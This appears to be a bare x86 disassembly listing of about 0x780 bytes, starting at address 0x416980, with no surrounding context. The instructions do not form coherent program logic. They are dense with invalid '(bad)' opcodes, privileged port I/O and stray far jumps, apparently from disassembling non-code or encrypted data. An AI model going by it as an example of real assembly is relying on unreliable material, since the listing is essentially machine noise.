  416980:	sub    DWORD PTR [eax+ecx*8],eax
  416983:	shl    BYTE PTR [edx-0xdf4cfac],cl
  416989:	out    dx,eax
  41698a:	fwait
  41698b:	aaa    
  41698c:	lods   al,BYTE PTR ds:[esi]
  41698d:	(bad)  
  41698e:	out    0xc8,al
  416990:	into   
  416991:	xor    BYTE PTR [esi-0x6eab01c0],al
  416997:	cwde   
  416998:	xlat   BYTE PTR ds:[ebx]
  416999:	frstor [ebp+ecx*4-0x7951575a]
  4169a0:	sbb    DWORD PTR [ebx+0x4ad31831],ebp
  4169a6:	xchg   DWORD PTR [ebx-0x75],edx
  4169a9:	js     0x4169bd
  4169ab:	ins    BYTE PTR es:[edi],dx
  4169ac:	mov    esi,0x1220cec6
  4169b1:	and    eax,0xfd05a376
  4169b6:	mov    eax,ds:0xd20141d9
  4169bb:	cdq    
  4169bc:	mov    al,ds:0xe3212752
  4169c1:	popf   
  4169c2:	or     al,0x58
  4169c4:	mov    dh,0x7f
  4169c6:	dec    esi
  4169c7:	pop    ds
  4169c8:	stc    
  4169c9:	add    cl,cl
  4169cb:	(bad)  
  4169cc:	rcl    BYTE PTR [ecx*2-0x6a38a327],cl
  4169d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169d4:	aas    
  4169d5:	xchg   esi,eax
  4169d6:	into   
  4169d7:	cmp    cl,BYTE PTR [ebp+eiz*8-0x22]
  4169db:	sub    BYTE PTR [esi+ebp*2],bl
  4169de:	loope  0x416a4a
  4169e0:	mov    DWORD PTR [esi],ebx
  4169e2:	pop    esp
  4169e3:	adc    BYTE PTR [ebp+0x582103a7],0x58
  4169ea:	iret   
  4169eb:	dec    esi
  4169ec:	ja     0x416a56
  4169ee:	sbb    al,0xb1
  4169f0:	pushf  
  4169f1:	jne    0x4169c0
  4169f3:	out    0xb0,eax
  4169f5:	xor    al,0x4d
  4169f7:	test   DWORD PTR [ebp+0x2cc6ab06],esi
  4169fd:	mov    eax,DWORD PTR [edi]
  4169ff:	add    bl,BYTE PTR [esi+ebx*2-0x4e]
  416a03:	xor    al,0xa5
  416a05:	(bad)  
  416a06:	out    0x88,al
  416a08:	sar    dl,1
  416a0a:	cmc    
  416a0b:	add    cl,BYTE PTR [esi+esi*1-0x10d3cc3e]
  416a12:	xchg   DWORD PTR [edx+0x1a],esp
  416a15:	lahf   
  416a16:	jg     0x4169ce
  416a18:	jne    0x4169dc
  416a1a:	sti    
  416a1b:	in     al,dx
  416a1c:	xor    BYTE PTR [edx+0x795688e1],bh
  416a22:	or     eax,0xef2c168d
  416a27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a28:	mov    eax,DWORD PTR [ebx]
  416a2a:	(bad)  
  416a2b:	ins    BYTE PTR es:[edi],dx
  416a2c:	(bad)
  416a2f:	ja     0x416a27
  416a31:	cmp    al,0x9a
  416a33:	loope  0x416aa3
  416a35:	xor    ah,BYTE PTR [esi-0x78]
  416a38:	mov    ebx,0x46d4adc1
  416a3d:	push   ss
  416a3e:	sbb    al,0x22
  416a40:	lds    ebx,FWORD PTR cs:[esp+edx*1]
  416a44:	jmp    DWORD PTR [edi-0x6b]
  416a47:	pop    ds
  416a48:	pop    ebp
  416a49:	mov    DWORD PTR [edi+0x56196d4c],ecx
  416a4f:	xchg   esi,eax
  416a50:	xchg   ebx,eax
  416a51:	cmp    al,0x87
  416a53:	loope  0x416a52
  416a55:	leave  
  416a56:	dec    edi
  416a57:	std    
  416a58:	pop    ss
  416a59:	or     eax,0x7dd8cc10
  416a5e:	mov    ebp,?
  416a60:	int3   
  416a61:	and    cl,BYTE PTR [esi]
  416a63:	sub    BYTE PTR [edi-0x32],cl
  416a66:	push   edi
  416a67:	dec    esp
  416a68:	(bad)  
  416a69:	test   BYTE PTR ds:0x4e8baa35,0x3a
  416a70:	fistp  WORD PTR [esi-0x6ff64b1e]
  416a76:	clc    
  416a77:	add    dl,dh
  416a79:	push   eax
  416a7a:	pop    ss
  416a7b:	mov    bh,0xd8
  416a7d:	dec    edx
  416a7e:	jmp    ecx
  416a80:	jg     0x416a4c
  416a82:	leave  
  416a83:	popf   
  416a84:	xor    ebx,0x36725104
  416a8a:	jmp    0xb3bc7d25
  416a8f:	add    eax,0xb11841c0
  416a94:	fnstcw WORD PTR [ebx]
  416a96:	ja     0x416afb
  416a98:	jns    0x416a88
  416a9a:	dec    edi
  416a9b:	scas   al,BYTE PTR es:[edi]
  416a9c:	mov    edx,0x3603be03
  416aa1:	outs   dx,BYTE PTR ds:[esi]
  416aa2:	inc    ebx
  416aa3:	rcl    DWORD PTR [edx-0x78],1
  416aa6:	ss (bad) 
  416aa8:	clc    
  416aa9:	ret    0xa404
  416aac:	outs   dx,DWORD PTR ds:[esi]
  416aad:	jmp    0x416a7c
  416aaf:	stos   BYTE PTR es:[edi],al
  416ab0:	adc    DWORD PTR [esi+0x2],ebp
  416ab3:	lods   al,BYTE PTR ds:[esi]
  416ab4:	aam    0xfd
  416ab6:	rcl    esp,0xd6
  416ab9:	jmp    ebp
  416abb:	inc    ebp
  416abc:	sbb    DWORD PTR [eax],edi
  416abe:	jns    0x416b19
  416ac0:	arpl   WORD PTR [ebp-0x27],di
  416ac3:	jae    0x416a5d
  416ac5:	repz inc ebx
  416ac7:	add    ch,BYTE PTR [edx-0x7d]
  416aca:	out    0x9a,eax
  416acc:	mov    al,ds:0xa2649e39
  416ad1:	mov    ch,0xc8
  416ad3:	push   edi
  416ad4:	push   ebx
  416ad5:	repz popa 
  416ad7:	add    al,0x9b
  416ad9:	ds ja  0x416b02
  416adc:	enter  0xe5e8,0x42
  416ae0:	adc    esp,ebx
  416ae2:	loopne 0x416b05
  416ae4:	arpl   WORD PTR [edi+0x2a8c2110],bx
  416aea:	add    al,0x0
  416aec:	je     0x416aee
  416aee:	stos   BYTE PTR es:[edi],al
  416aef:	std    
  416af0:	icebp  
  416af1:	iret   
  416af2:	push   eax
  416af3:	mov    edx,0xb1721788
  416af8:	out    0xdc,eax
  416afa:	icebp  
  416afb:	loope  0x416b42
  416afd:	and    DWORD PTR [edi],ebx
  416aff:	sub    bl,BYTE PTR [esi+ecx*1+0x24]
  416b03:	pop    edx
  416b04:	mov    ?,ebx
  416b06:	int    0x53
  416b08:	maskmovq mm7,(bad)
  416b09:	idiv   DWORD PTR [ebp-0x42]
  416b0c:	cmp    DWORD PTR cs:[ecx-0x10],ebx
  416b10:	xchg   edx,eax
  416b11:	je     0x416b91
  416b13:	sbb    BYTE PTR [eax+0xd],dh
  416b16:	outs   dx,DWORD PTR ds:[esi]
  416b17:	mov    WORD PTR [ebx+eiz*4-0x24899995],fs
  416b1e:	sahf   
  416b1f:	imul   ebx,DWORD PTR [ebx-0x3ce50c6e],0x9867c4e8
  416b29:	jbe    0x416b77
  416b2b:	shl    DWORD PTR [eax+0x7c],1
  416b2e:	leave  
  416b2f:	push   0x77
  416b31:	xchg   edx,eax
  416b32:	jnp    0x416b48
  416b34:	xchg   esi,eax
  416b35:	pop    eax
  416b36:	iret   
  416b37:	fistp  DWORD PTR [ebx+0x23a426a9]
  416b3d:	mov    ?,eax
  416b3f:	les    edx,FWORD PTR [ebx+0x3e]
  416b42:	cmp    eax,0x4f0a9a74
  416b47:	loopne 0x416b7b
  416b49:	push   cs
  416b4a:	jmp    0xe452:0x383d4dbc
  416b51:	sub    DWORD PTR [ebx+0x1a],0x24ef8368
  416b58:	std    
  416b59:	es mov ah,0x9a
  416b5c:	jg     0x416b34
  416b5e:	adc    DWORD PTR [edi+0x50fd14d8],edx
  416b64:	cmp    BYTE PTR [ebp-0x25352e79],ah
  416b6a:	sub    BYTE PTR [esi],ah
  416b6c:	or     al,0x18
  416b6e:	pop    eax
  416b6f:	mov    ecx,0xa422ada9
  416b74:	and    BYTE PTR [edi],ch
  416b76:	mov    ?,WORD PTR [ebp+0x26]
  416b79:	int    0xde
  416b7b:	arpl   WORD PTR [ebx+0x6b],dx
  416b7e:	call   0xe7b2:0x875d96fe
  416b85:	mov    al,0xe6
  416b87:	adc    DWORD PTR ds:0xcd456bbb,ebp
  416b8d:	test   dh,0x5e
  416b90:	cmc    
  416b91:	cmp    ebx,DWORD PTR [ecx+esi*2]
  416b94:	mov    eax,ds:0x232ebe9f
  416b99:	or     eax,DWORD PTR [edi+0x5d]
  416b9c:	leave  
  416b9d:	sbb    al,0x65
  416b9f:	inc    ebx
  416ba0:	pushf  
  416ba1:	push   cs
  416ba2:	push   0x56
  416ba4:	ds sti 
  416ba6:	cdq    
  416ba7:	push   esp
  416ba8:	mov    ah,bl
  416baa:	imul   esi
  416bac:	addr16 cli 
  416bae:	push   edx
  416baf:	fs xor al,0x84
  416bb2:	retf   0xf37e
  416bb5:	hlt    
  416bb6:	mov    esi,0xe5396833
  416bbb:	push   esp
  416bbc:	jp     0x416be9
  416bbe:	shl    BYTE PTR [edi+0x11],0xca
  416bc2:	push   edx
  416bc3:	and    eax,0x40ec3c74
  416bc8:	std    
  416bc9:	shr    BYTE PTR [edi+ebx*8+0x2606b878],1
  416bd0:	int3   
  416bd1:	cmp    BYTE PTR [ebx],0x11
  416bd4:	(bad)  
  416bd5:	jg     0x416bc5
  416bd7:	es inc esi
  416bd9:	repz lock jmp 0x416bb4
  416bdd:	xor    BYTE PTR [edx-0x5cd3130],bh
  416be3:	push   0xa718afc3
  416be8:	and    DWORD PTR [edx+0x1ba66046],0xffffff99
  416bef:	push   ebp
  416bf0:	mov    dl,0xa1
  416bf2:	pop    es
  416bf3:	sbb    al,0x3c
  416bf5:	adc    DWORD PTR [ebp-0x37],esi
  416bf8:	xor    esp,DWORD PTR [eax]
  416bfa:	cld    
  416bfb:	jge    0x416c38
  416bfd:	cwde   
  416bfe:	ret    0x8dca
  416c01:	inc    ecx
  416c02:	pusha  
  416c03:	shl    cl,0x52
  416c06:	(bad)  
  416c07:	in     al,0x58
  416c09:	sbb    ah,bh
  416c0b:	push   cs
  416c0c:	jge    0x416c23
  416c0e:	push   esp
  416c0f:	idiv   BYTE PTR [eax]
  416c11:	shl    BYTE PTR [esi+0x6ee52ee8],cl
  416c17:	push   eax
  416c18:	stc    
  416c19:	scas   eax,DWORD PTR es:[edi]
  416c1a:	mov    dh,BYTE PTR [ebx+0x54]
  416c1d:	mov    eax,ds:0x7ae0e17e
  416c22:	mov    cl,0xfa
  416c24:	add    BYTE PTR [eax],ch
  416c26:	or     BYTE PTR [ebp-0x322f3e28],bh
  416c2c:	pop    ebp
  416c2d:	scas   al,BYTE PTR es:[edi]
  416c2e:	mov    ds:0x370ccec3,eax
  416c33:	mov    ah,0x73
  416c35:	in     eax,0x71
  416c37:	stos   DWORD PTR es:[edi],eax
  416c38:	and    eax,0x97c61d1e
  416c3d:	sbb    BYTE PTR [ebx],dl
  416c3f:	bound  edi,QWORD PTR [esi+edi*1]
  416c42:	jl     0x416c06
  416c44:	and    BYTE PTR [edx-0x6e],ch
  416c47:	pop    edi
  416c48:	pop    DWORD PTR [ebp-0x69b9395e]
  416c4e:	jnp    0x416c5a
  416c50:	xchg   edi,esi
  416c52:	les    esp,FWORD PTR es:[esi+0x7a]
  416c56:	mov    ebx,0x355ee0b0
  416c5b:	out    0x97,eax
  416c5d:	mov    esi,0xbc4707fa
  416c62:	pop    ecx
  416c63:	rol    DWORD PTR [ecx+0x59],cl
  416c66:	pop    edx
  416c67:	lods   eax,DWORD PTR ds:[esi]
  416c68:	addr16 leave 
  416c6a:	sahf   
  416c6b:	pop    edi
  416c6c:	dec    BYTE PTR [edx+0x390d78f5]
  416c72:	jmp    0xfa401499
  416c77:	push   esp
  416c78:	(bad)  
  416c79:	mov    dl,0x14
  416c7b:	repz loop 0x416ce9
  416c7e:	mov    al,0x82
  416c80:	jns    0x416cda
  416c82:	popf   
  416c83:	ja     0x416c4a
  416c85:	mov    ds:0x41cddc67,al
  416c8a:	les    ebp,FWORD PTR [ecx]
  416c8c:	dec    ecx
  416c8d:	or     ebx,DWORD PTR [esi+0x61bb8a2f]
  416c93:	sar    DWORD PTR [ebx+0x338af6ba],1
  416c99:	fdiv   QWORD PTR [ebp-0xa]
  416c9c:	xor    eax,0xe9154b72
  416ca1:	lods   eax,DWORD PTR ds:[esi]
  416ca2:	(bad)  
  416ca4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ca5:	idiv   BYTE PTR [ebp+0x5e4aa30d]
  416cab:	stos   BYTE PTR es:[edi],al
  416cac:	or     ah,BYTE PTR [edx]
  416cae:	(bad)  
  416cb0:	mov    bl,0x72
  416cb2:	add    al,0x25
  416cb4:	adc    ecx,DWORD PTR [esi+0x68d0e5a1]
  416cba:	repnz scas eax,DWORD PTR es:[edi]
  416cbc:	inc    eax
  416cbd:	shl    BYTE PTR [edi+0x32],1
  416cc0:	inc    esi
  416cc1:	fs xor al,0x63
  416cc4:	out    0xd3,al
  416cc6:	push   0x48
  416cc8:	or     DWORD PTR [ecx+0x26],ebp
  416ccb:	cmp    dl,BYTE PTR [ebx-0x35]
  416cce:	pusha  
  416ccf:	lock stos BYTE PTR es:[edi],al
  416cd1:	mov    cs,WORD PTR [ebx+0x3b5874b4]
  416cd7:	or     al,0x12
  416cd9:	imul   ebp,DWORD PTR [eax],0x96d09db8
  416cdf:	inc    ecx
  416ce0:	imul   BYTE PTR [ebx-0x26]
  416ce3:	inc    ebp
  416ce4:	adc    ch,BYTE PTR [eax]
  416ce6:	repnz int3 
  416ce8:	cmp    eax,0x59e8bc6e
  416ced:	sbb    ebp,esi
  416cef:	mov    ecx,0xd05b0dae
  416cf4:	cmp    eax,0x9a7cf9ca
  416cf9:	sbb    DWORD PTR [ebx],0xf95e3fe1
  416cff:	push   esi
  416d00:	xor    BYTE PTR [edx],al
  416d02:	push   ebp
  416d03:	cmp    eax,0xaf703315
  416d08:	mov    edi,0xbe9a0f8d
  416d0d:	cli    
  416d0e:	jae    0x416d80
  416d10:	dec    eax
  416d11:	inc    eax
  416d12:	dec    edx
  416d13:	ficomp WORD PTR [esi]
  416d15:	fnstcw WORD PTR [edx]
  416d17:	jnp    0x416ccd
  416d19:	xor    eax,0x28c96eaf
  416d1e:	leave  
  416d1f:	hlt    
  416d20:	pop    esi
  416d21:	mov    ebp,0x184a5a83
  416d26:	and    eax,0xf5e7a3e8
  416d2b:	jb     0x416d15
  416d2d:	sub    BYTE PTR [edx+eiz*1],0x8a
  416d31:	dec    esp
  416d32:	aad    0x7e
  416d34:	jecxz  0x416da9
  416d36:	mov    ebx,0x447de82c
  416d3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d3c:	push   cs
  416d3d:	cmp    esp,ecx
  416d3f:	xor    al,0xdc
  416d41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d42:	xor    BYTE PTR fs:[edi+eax*1+0x9986aa],bl
  416d4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d4b:	xchg   ebp,eax
  416d4c:	push   cs
  416d4d:	adc    al,0x98
  416d4f:	cmc    
  416d50:	sub    al,cl
  416d52:	push   edx
  416d53:	aaa    
  416d54:	pop    esp
  416d55:	push   ss
  416d56:	lds    ebx,FWORD PTR [edx+0x65]
  416d59:	std    
  416d5a:	pop    ecx
  416d5b:	mov    al,0xb9
  416d5d:	xchg   esp,eax
  416d5e:	aas    
  416d5f:	aam    0x20
  416d61:	jae    0x416cee
  416d63:	ins    BYTE PTR es:[edi],dx
  416d64:	jg     0x416d38
  416d66:	popa   
  416d67:	fidiv  WORD PTR [ebp-0x7f]
  416d6a:	out    0xe9,eax
  416d6c:	aad    0x82
  416d6e:	jo     0x416d02
  416d70:	loop   0x416d3b
  416d72:	jno    0x416dbd
  416d74:	cmp    BYTE PTR ds:0x341fe9be,dh
  416d7a:	push   esi
  416d7b:	pop    esi
  416d7c:	adc    esi,esi
  416d7e:	push   0xffffffc9
  416d80:	inc    ebp
  416d81:	jmp    0x78cc:0x531cb562
  416d88:	push   esi
  416d89:	sbb    BYTE PTR [esi+edx*8-0x2b],cl
  416d8d:	sub    BYTE PTR [ebx+0x17083cd6],0xc2
  416d94:	mov    al,BYTE PTR [ecx+0x29644956]
  416d9a:	add    al,0xb9
  416d9c:	push   edi
  416d9d:	bound  ebx,QWORD PTR [esi-0x25]
  416da0:	in     al,0xf9
  416da2:	and    al,0x28
  416da4:	mov    ?,ebp
  416da6:	sbb    ch,BYTE PTR [edi-0x33]
  416da9:	nop
  416daa:	enter  0xea4b,0xcd
  416dae:	cmp    al,0xb8
  416db0:	mov    eax,ds:0xd3d11e02
  416db5:	jge    0x416d63
  416db7:	pop    ss
  416db8:	adc    BYTE PTR [edi+0x4ee2f1e1],bl
  416dbe:	push   edi
  416dbf:	jae    0x416d48
  416dc1:	and    al,0x57
  416dc3:	cmc    
  416dc4:	inc    edi
  416dc5:	mov    edx,0x6e14b4aa
  416dca:	(bad)
  416dcf:	sbb    al,0x73
  416dd1:	mov    edi,DWORD PTR [eax+0x159f67f3]
  416dd7:	push   ebx
  416dd8:	adc    DWORD PTR [bp+si-0x1af9],edx
  416ddd:	or     ah,BYTE PTR [esi-0x2fa335ac]
  416de3:	jb     0x416e39
  416de5:	in     al,0x23
  416de7:	jmp    0x6e97612b
  416dec:	inc    ebp
  416ded:	(bad)  
  416dee:	push   0x3f
  416df0:	pop    edx
  416df1:	push   ebp
  416df2:	xchg   ebp,eax
  416df3:	out    0x88,eax
  416df5:	dec    esi
  416df6:	jnp    0x416d87
  416df8:	pop    es
  416df9:	sub    BYTE PTR [edi],bl
  416dfb:	div    DWORD PTR [esi-0x6e61d325]
  416e01:	aad    0xb3
  416e03:	mov    esp,0x94a8347b
  416e08:	mov    esi,0x2a70c908
  416e0d:	adc    eax,DWORD PTR [eax-0x78621fe4]
  416e13:	les    edi,FWORD PTR [ecx+0x6c]
  416e16:	stos   BYTE PTR es:[edi],al
  416e17:	gs (bad) 
  416e19:	fist   WORD PTR [ebp+0xb]
  416e1c:	add    DWORD PTR [ebx+0x5f97aafa],esp
  416e22:	(bad)  
  416e23:	aaa    
  416e24:	inc    eax
  416e25:	xor    ch,BYTE PTR [ecx]
  416e27:	jge    0x416e17
  416e29:	aaa    
  416e2a:	in     eax,0xf9
  416e2c:	cmp    DWORD PTR [eax],esi
  416e2e:	sti    
  416e2f:	mov    ?,WORD PTR [esi]
  416e31:	les    eax,FWORD PTR [ebp+0x66]
  416e34:	jmp    0x53d:0x8325f900
  416e3b:	add    BYTE PTR ds:0x9bb4134,bl
  416e41:	pop    ebx
  416e42:	mov    ah,0xb5
  416e44:	(bad)  
  416e45:	jb     0x416e6c
  416e47:	fwait
  416e48:	mov    dh,BYTE PTR [edi]
  416e4a:	sub    BYTE PTR [ebp+0x1e],ah
  416e4d:	das    
  416e4e:	int    0x5
  416e50:	out    dx,eax
  416e51:	sub    eax,0xba0cb8dc
  416e56:	aaa    
  416e57:	mov    dh,0xd0
  416e59:	sub    ah,cl
  416e5b:	mov    BYTE PTR [edx+0x3e],dl
  416e5e:	mov    dl,0xca
  416e60:	push   esp
  416e61:	sahf   
  416e62:	int    0xa7
  416e64:	mov    ch,ah
  416e66:	xor    ah,BYTE PTR [edx]
  416e68:	sub    bl,BYTE PTR [edi]
  416e6a:	mov    al,0x61
  416e6c:	retf   
  416e6d:	pop    es
  416e6e:	push   esp
  416e6f:	push   es
  416e70:	xchg   ebp,eax
  416e71:	aas    
  416e72:	ss inc eax
  416e74:	ds test eax,0x68554e0f
  416e7a:	leave  
  416e7b:	dec    esi
  416e7c:	test   al,0x99
  416e7e:	jno    0x416ece
  416e80:	jmp    0xb2dcfdb4
  416e85:	mov    dh,BYTE PTR [esi-0x18]
  416e88:	mov    bl,0xae
  416e8a:	aaa    
  416e8b:	xor    BYTE PTR [ebx-0x40],0xf9
  416e8f:	push   ds
  416e90:	mov    al,0x15
  416e92:	imul   eax,DWORD PTR [edi],0x9f29dbff
  416e98:	inc    ecx
  416e99:	call   0x51fb:0xf3ea25e1
  416ea0:	jle    0x416ed9
  416ea2:	adc    eax,0x64e84aca
  416ea7:	std    
  416ea8:	xor    BYTE PTR [ebx+0x13],cl
  416eab:	leave  
  416eac:	out    dx,eax
  416ead:	and    ch,ch
  416eaf:	lods   al,BYTE PTR ds:[esi]
  416eb0:	data16 mov ah,0x75
  416eb3:	jg     0x416ea8
  416eb5:	mov    ah,0xbc
  416eb7:	xor    al,0xbf
  416eb9:	xchg   ebp,eax
  416eba:	mov    eax,ds:0x30df0772
  416ebf:	push   esp
  416ec0:	jp     0x416ed9
  416ec2:	pushf  
  416ec3:	xchg   esi,eax
  416ec4:	in     al,0x55
  416ec6:	cmp    DWORD PTR [edi],eax
  416ec8:	xchg   esi,eax
  416ec9:	mov    BYTE PTR [esi-0x1c66a182],bl
  416ecf:	adc    BYTE PTR [edx+0x2e],dl
  416ed2:	cmp    bl,BYTE PTR [edx]
  416ed4:	or     BYTE PTR [ebp-0x13],cl
  416ed7:	mov    ecx,0x2e7af16f
  416edc:	outs   dx,BYTE PTR ds:[esi]
  416edd:	adc    eax,DWORD PTR [ebp-0x24]
  416ee0:	js     0x416ebd
  416ee2:	dec    ecx
  416ee3:	pop    ss
  416ee4:	xor    eax,DWORD PTR [ebp+eax*2-0x62d9ff81]
  416eeb:	in     al,0x84
  416eed:	push   cs
  416eee:	jle    0x416f18
  416ef0:	fisttp QWORD PTR [edx]
  416ef2:	out    dx,al
  416ef3:	jg     0x416f4b
  416ef5:	out    dx,al
  416ef6:	inc    ecx
  416ef7:	mov    ds:0x48a6c9cc,eax
  416efc:	loopne 0x416ee1
  416efe:	sub    bh,BYTE PTR [ecx+0x62]
  416f01:	jb     0x416ef9
  416f03:	es in  eax,0x73
  416f06:	sub    BYTE PTR [ebp+0x48654cd2],bl
  416f0c:	dec    edx
  416f0d:	dec    ebp
  416f0e:	jle    0x416e94
  416f10:	fld    QWORD PTR [edx-0x17]
  416f13:	push   0x30
  416f15:	dec    ebp
  416f16:	xchg   edi,eax
  416f17:	out    0x69,eax
  416f19:	push   ss
  416f1a:	push   ss
  416f1b:	fs cld 
  416f1d:	leave  
  416f1e:	sbb    al,0x85
  416f20:	jg     0x416eb0
  416f22:	pop    edx
  416f23:	dec    esp
  416f24:	lods   al,BYTE PTR ds:[esi]
  416f25:	es dec ebp
  416f27:	das    
  416f28:	mov    al,0x40
  416f2a:	xchg   esp,eax
  416f2b:	xor    BYTE PTR [ecx],ah
  416f2d:	dec    eax
  416f2e:	(bad)  
  416f2f:	js     0x416f36
  416f31:	lahf   
  416f32:	int3   
  416f33:	lods   eax,DWORD PTR ds:[esi]
  416f34:	rcr    BYTE PTR [ecx+0x4a],cl
  416f37:	xchg   esp,eax
  416f38:	mov    dl,0xa5
  416f3a:	test   BYTE PTR [ebx+0x74101ae6],al
  416f40:	js     0x416f1d
  416f42:	jnp    0x416eed
  416f44:	xlat   BYTE PTR ds:[ebx]
  416f45:	dec    ebx
  416f46:	cs push edx
  416f48:	pusha  
  416f49:	xchg   DWORD PTR [eax],esp
  416f4b:	test   al,0xdc
  416f4d:	pop    edi
  416f4e:	push   esp
  416f4f:	sbb    eax,0x5020f383
  416f54:	adc    al,0xda
  416f56:	sub    esi,DWORD PTR [ecx-0x704c7d50]
  416f5c:	xchg   ebp,eax
  416f5d:	iret   
  416f5e:	pop    es
  416f5f:	iret   
  416f60:	(bad)  
  416f61:	pop    edx
  416f62:	or     dl,dl
  416f64:	loopne 0x416ef5
  416f66:	add    al,0x7e
  416f68:	out    0x30,eax
  416f6a:	xor    BYTE PTR [bp+si-0x70f8],dh
  416f6f:	mov    dh,0xc
  416f71:	repnz push cs
  416f73:	jns    0x416f1e
  416f75:	les    ebp,FWORD PTR [esi-0x595d897b]
  416f7b:	and    eax,esp
  416f7d:	jg     0x416fdb
  416f7f:	loope  0x416fb7
  416f81:	jmp    0x416f07
  416f83:	gs rol ecx,1
  416f86:	mov    ah,BYTE PTR [eax+0x1c]
  416f89:	xlat   BYTE PTR ds:[ebx]
  416f8a:	xlat   BYTE PTR ds:[ebx]
  416f8b:	xor    BYTE PTR [eax+0x615f85dc],bh
  416f91:	shl    DWORD PTR [ecx],cl
  416f93:	outs   dx,DWORD PTR ds:[esi]
  416f94:	call   0xecf:0x979b408a
  416f9b:	add    eax,0x4d76bec1
  416fa0:	into   
  416fa1:	mov    WORD PTR [eax],?
  416fa3:	add    DWORD PTR [ecx-0x7],edi
  416fa6:	out    0x3d,al
  416fa8:	adc    DWORD PTR [ebx-0x1a30fcf6],edx
  416fae:	data16 into 
  416fb0:	and    DWORD PTR [edi+0xafb3650],edi
  416fb6:	daa    
  416fb7:	xchg   BYTE PTR [edi+0x1e],dh
  416fba:	dec    esp
  416fbb:	aad    0x25
  416fbd:	sub    eax,0x8339467c
  416fc2:	push   edx
  416fc3:	pop    ss
  416fc4:	xor    edx,DWORD PTR [eax]
  416fc6:	cwde   
  416fc7:	xchg   esp,eax
  416fc8:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fca:	mov    ds,esi
  416fcc:	jmp    0x3141d643
  416fd1:	jb     0x416fbe
  416fd3:	pop    ds
  416fd4:	ins    BYTE PTR es:[edi],dx
  416fd5:	pop    es
  416fd6:	xchg   edx,eax
  416fd7:	mov    esp,0x56f7042a
  416fdc:	adc    BYTE PTR fs:[eax-0x71],dl
  416fe0:	inc    eax
  416fe1:	xor    al,0x48
  416fe3:	addr16 dec ebx
  416fe5:	aam    0x44
  416fe7:	add    eax,eax
  416fe9:	cmc    
  416fea:	or     eax,0x38e0db1c
  416fef:	out    0x8e,eax
  416ff1:	jl     0x41706c
  416ff3:	mov    edx,0xd432c921
  416ff8:	mov    ch,0x4d
  416ffa:	mov    ds:0x22a78cdf,eax
  416fff:	dec    esp
  417000:	add    BYTE PTR [ecx+ebp*4-0x58],bh
  417004:	in     eax,0xf3
  417006:	lock rol DWORD PTR [ebx],cl
  417009:	or     eax,0x8c065582
  41700e:	inc    eax
  41700f:	pop    edx
  417010:	add    DWORD PTR gs:[ebp-0x6e],eax
  417014:	jne    0x416ff0
  417016:	and    eax,0x4643a946
  41701b:	retf   0x3eae
  41701e:	icebp  
  41701f:	lods   eax,DWORD PTR ds:[esi]
  417020:	jb     0x416ff8
  417022:	in     eax,0xde
  417024:	pop    esp
  417025:	mov    ch,0xe7
  417027:	mov    eax,0x32257ac0
  41702c:	xor    BYTE PTR [ecx+0x4a],dh
  41702f:	xchg   ebp,eax
  417030:	mov    esp,0x189fb555
  417035:	jge    0x417065
  417037:	mov    cl,0x60
  417039:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41703a:	ret    
  41703b:	popf   
  41703c:	jg     0x416fc8
  41703e:	add    ch,dh
  417040:	cmp    BYTE PTR [ebx+0x7e],bl
  417043:	adc    DWORD PTR [edx+eiz*1-0x37888e21],0x8c9b7802
  41704e:	sbb    BYTE PTR [ecx+0x4b10295a],ah
  417054:	sbb    al,0x92
  417056:	jbe    0x417037
  417058:	mov    ?,WORD PTR [ebp-0x296e0b82]
  41705e:	(bad)  
  417060:	(bad)  
  417061:	pop    ebp
  417062:	pop    ebp
  417063:	mov    ?,WORD PTR [eax-0x13551a55]
  417069:	xor    cl,BYTE PTR [esi]
  41706b:	fstp   DWORD PTR [ecx]
  41706d:	sbb    al,0x18
  41706f:	js     0x416fff
  417071:	je     0x4170df
  417073:	loope  0x4170bb
  417075:	sti    
  417076:	ds push 0xb4b2dd5b
  41707c:	cmp    al,0xa7
  41707e:	mov    al,0x45
  417080:	jg     0x41703f
  417082:	mov    dh,0x32
  417084:	(bad)  
  417085:	pop    esp
  417086:	cmc    
  417087:	arpl   WORD PTR [ecx+ecx*4],bx
  41708a:	mov    eax,0x2341b3ca
  41708f:	aad    0xe9
  417091:	shl    DWORD PTR [esi],1
  417093:	pop    ecx
  417094:	in     al,dx
  417095:	sar    BYTE PTR [ebx-0x46e46763],1
  41709b:	xor    al,0x62
  41709d:	mov    dl,0xbe
  41709f:	sbb    DWORD PTR [edi],ebx
  4170a1:	fdiv   st(5),st
  4170a3:	mov    gs,WORD PTR [ecx-0x35]
  4170a6:	push   cs
  4170a7:	sub    esp,DWORD PTR [edi+edx*2-0x1f]
  4170ab:	xlat   BYTE PTR ds:[ebx]
  4170ac:	push   cs
  4170ad:	or     BYTE PTR [ecx-0x55],0xa3
  4170b1:	nop
  4170b2:	hlt    
  4170b3:	sar    DWORD PTR [ebx],cl
  4170b5:	enter  0x7a53,0xec
  4170b9:	stos   DWORD PTR es:[edi],eax
  4170ba:	xor    ebx,DWORD PTR [edx+ebp*8]
  4170bd:	adc    DWORD PTR [esi+0x333d653f],ebp
  4170c3:	mov    ds:0x8e36d5,eax
  4170c8:	mov    WORD PTR [esi-0x5eec7246],ss
  4170ce:	mov    edx,0x1af98062
  4170d3:	bound  esp,QWORD PTR [edx]
  4170d5:	pop    ebx
  4170d6:	lods   eax,DWORD PTR ds:[esi]
  4170d7:	xchg   ebp,eax
  4170d8:	and    dl,ch
  4170da:	push   ebp
  4170db:	jge    0x4170ae
  4170dd:	and    edi,esp
  4170df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4170e0:	jecxz  0x4170d1
  4170e2:	sub    al,0x85
  4170e4:	jnp    0x417163
  4170e6:	lods   eax,DWORD PTR ds:[esi]
  4170e7:	xchg   ecx,eax
  4170e8:	out    0xeb,eax
  4170ea:	cmp    dl,BYTE PTR [esi-0x62a8072a]
  4170f0:	rcr    BYTE PTR [ebx+0x4],1
  4170f3:	pop    edi
  4170f4:	(bad)  
  4170f5:	jg     0x417121
  4170f7:	jge    0x4170ac
  4170f9:	test   al,0x29
  4170fb:	ins    DWORD PTR es:[edi],dx
